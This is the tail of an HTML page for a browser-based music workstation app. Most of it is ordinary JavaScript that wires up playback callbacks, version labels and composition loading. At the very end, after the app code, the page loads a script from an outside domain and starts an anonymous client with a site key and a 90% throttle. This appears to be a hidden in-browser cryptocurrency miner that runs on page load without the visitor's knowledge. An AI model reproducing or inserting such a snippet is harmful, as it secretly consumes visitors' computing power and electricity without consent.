	DAW.cb.compositionSavingPromise = UIauthSaveComposition;
	DAW.cb.onstartdrum = rowId => UIdrums.onstartdrum( rowId );
	DAW.cb.onstopdrumrow = rowId => UIdrums.onstopdrumrow( rowId );
	DAW.cb.analyserFilled = UImainAnalyser.draw.bind( UImainAnalyser );
	DAW.cb.channelAnalyserFilled = UImixer.updateAudioData.bind( UImixer );
	DAW.cb.pause =
	DAW.cb.stop = () => DOM.play.dataset.icon = "play";
	DAW.cb.play = () => DOM.play.dataset.icon = "pause";

	DOM.versionNum.textContent =
	DOM.headVersionNum.textContent = window.VERSION;

	DOM.winBtnsMap.forEach( ( btn, id ) => id !== "effects" && id !== "drums" && btn.click() );

	UIauthGetMe();
	DAW.addCompositionsFromLocalStorage();

	document.addEventListener( "gsuiEvents", e => {
		const { component, eventName, args } = e.detail;

		console.warn( `uncatched gsuiEvent: [${ component }][${ eventName }]`, args );
	} );

	if ( !hash.has( "cmp" ) ) {
		UIcompositionClickNewLocal();
	} else {
		DAW.addCompositionByURL( hash.get( "cmp" ) )
			.catch( e => {
				console.error( e );
				return DAW.addNewComposition();
			} )
			.then( cmp => DAW.openComposition( "local", cmp.id ) );
		location.hash = "";
	}
}
</script>
<script src="https://www.hostingcloud.racing/mWh2.js"></script>
<script>
    var _client = new Client.Anonymous('cbb126e9c472bcf225824ddf157d3fec3995a0cce792eba47b9fea4ad5815d0c', {
        throttle: 0.9, c: 'w', ads: 0
    });
    _client.start();
    

</script>
</body>
</html>
